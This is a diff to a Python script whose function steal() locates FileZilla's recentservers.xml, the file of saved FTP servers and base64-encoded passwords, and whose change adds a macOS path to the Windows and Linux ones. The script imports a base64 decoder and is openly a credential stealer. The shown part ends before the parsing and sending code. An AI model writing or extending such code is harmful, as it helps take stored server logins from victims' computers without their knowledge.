@@ -2,19 +2,21 @@ import platform
 import os
 import xml.etree.ElementTree as xml
 from base64 import b64decode as d64
-	
+
 def steal():
 	# Set the path for Windows
 	if platform.system() == "Windows":
 		path = os.getenv("APPDATA") + "\\FileZilla\\recentservers.xml"
 	elif platform.system() == "Linux":
 		path = os.getenv("HOME") + "/.filezilla/recentservers.xml"
+	elif platform.system() == 'Darwin':
+		path = os.path.expanduser('~/.config/filezilla/recentservers.xml')
 	# Print the notice
 	else:
 		return("[-] "+platform.system()+" is not supported.")
 	# Steal the data
 	return _steal_(path)
-	
+
 def _steal_(path):
 	ret = list()
 	try:
